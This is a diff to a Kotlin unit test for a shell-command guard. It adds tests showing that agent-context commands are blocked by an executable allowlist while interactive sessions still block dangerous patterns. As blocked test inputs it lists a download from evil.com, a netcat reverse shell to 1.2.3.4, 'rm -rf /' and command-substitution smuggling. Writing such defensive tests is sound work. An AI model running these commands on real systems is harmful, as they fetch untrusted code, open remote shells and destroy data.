@@ -73,4 +73,29 @@ class SafeCommandGuardTest {
         assertFalse(isAllowed("cat \$(rm -rf /data/x)"))
         assertFalse(isAllowed("echo `rm -rf /data/x`"))
     }
+
+    // ===== P2-8：非交互（agent）上下文可执行名白名单 =====
+
+    @Test
+    fun agentBlocksUnauthorizedExecutables() {
+        val blocked = listOf(
+            "python3 script.py",
+            "node -e \"evil\"",
+            "curl http://evil.com/x",
+            "wget http://evil.com/x",
+            "nc -e /bin/sh 1.2.3.4 4444",
+            "telnet host",
+            "bash ./unknown.sh",
+        )
+        for (cmd in blocked) {
+            assertEquals("应拦截: $cmd", SafeCommandGuard.Verdict.BLOCK, SafeCommandGuard.check(cmd).verdict)
+        }
+    }
+
+    @Test
+    fun interactiveBypassesAllowlistButKeepsDangerousBlock() {
+        // 交互会话不受白名单限制（用户手动），但危险模式仍拦截
+        assertEquals(SafeCommandGuard.Verdict.ALLOW, SafeCommandGuard.check("python3 tool.py", interactive = true).verdict)
+        assertEquals(SafeCommandGuard.Verdict.BLOCK, SafeCommandGuard.check("rm -rf /", interactive = true).verdict)
+    }
 }
